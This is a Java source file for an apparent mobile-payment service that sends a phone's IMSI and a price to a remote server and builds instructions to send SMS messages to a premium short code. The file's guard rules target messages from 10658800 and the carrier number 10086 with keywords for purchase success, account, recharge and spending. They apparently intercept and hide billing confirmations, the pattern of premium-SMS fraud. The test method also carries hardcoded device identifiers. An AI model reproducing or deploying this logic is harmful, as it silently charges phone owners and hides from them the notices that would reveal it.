package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.StringUtils;
import com.qlzf.commons.helper.MD5Encrypt;

/**
 * 
http://pc.rsbwl.com/CBS/mm/demo.jsp?uid=460022101441340&bid=100&ext=100

{"status":"0","msg":"Success","sms":"a3#1TG0O#1DNCAZI#4J2B8HS27W#3HHKQDGVMA#2O6BG7#AMU7NXXHL#E09921062D53E9ED#90EA992351443417#FA311F9443165CA6#test","code":"1065842410"}
 * @author leoliu
 *
 */
public class BjjsMm5DynamicService implements IDynamicService{

	private static final String TYPE = "bjjsMm5";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "uid={imsi}&bid={price}&ext={ext}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = map.get("imsi");
			String price = map.get("price");
			String ext = StringUtils.defaultString(map.get("ext"));
			
			String param = REQUESTMODEL.replace("{imsi}",imsi).replace("{price}",price).replace("{ext}",ext);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	/**
	 * {"status":"0","msg":"Success","sms":"a3#1TG0O#1DNCAZI#4J2B8HS27W#3HHKQDGVMA#2O6BG7#AMU7NXXHL#E09921062D53E9ED#90EA992351443417#FA311F9443165CA6#test","code":"1065842410"} 
	 * @param responseJson
	 * @return
	 */
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String status = jo.getString("status");
				
				if("0".equals(status)){
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(jo.getString("sms"));
					sms.setSmsDest(jo.getString("code"));
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
private static Map<String, String> proMap = new HashMap<String, String>();
	
	/**
	 * 01 安徽    02 北京  03 福建  04 甘肃  05 广东  06 广西  07 贵州  08 海南  09 河北  10 河南  11 黑龙江		
		12 湖北  13 湖南 14 吉林 15 江苏 16 江西 17 辽宁 18 内蒙古 19 宁夏 20 青海 21 山东 22 山西
		23 陕西 24 上海 25 四川 26 天津 27 西藏 28 新疆 29 云南 30 浙江 31 重庆
	 * 
	 */
	
	static{
		proMap.put("8611", "02");
		proMap.put("8612", "26");
		proMap.put("8613", "09");
		proMap.put("8614", "22");
		proMap.put("8615", "18");
		proMap.put("8621", "17");
		proMap.put("8622", "14");
		proMap.put("8623", "11");
		proMap.put("8631", "24");
		proMap.put("8632", "15");
		proMap.put("8633", "30");
		proMap.put("8634", "01");
		proMap.put("8635", "03");
		proMap.put("8636", "16");
		proMap.put("8637", "21");
		proMap.put("8641", "10");
		proMap.put("8642", "12");
		proMap.put("8643", "13");
		proMap.put("8644", "05");
		proMap.put("8645", "06");
		proMap.put("8646", "08");
		proMap.put("8650", "31");
		proMap.put("8651", "25");
		proMap.put("8652", "07");
		proMap.put("8653", "29");
		proMap.put("8654", "27");
		proMap.put("8661", "23");
		proMap.put("8662", "04");
		proMap.put("8663", "20");
		proMap.put("8664", "19");
		proMap.put("8665", "28");
	}
	
	public static void main(String[] args){
		
		String url = "http://mm.rsbwl.com/CBS/mm/zy.jsp";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a087654321");
		map.put("imei", "862949029214504");
		map.put("imsi", "460022101441340");
		map.put("price","400");
		map.put("ext","400");
		map.put("type", "bjjsMm5");
		
		System.out.println(new BjjsMm5DynamicService().dynamic(map));
	}

}
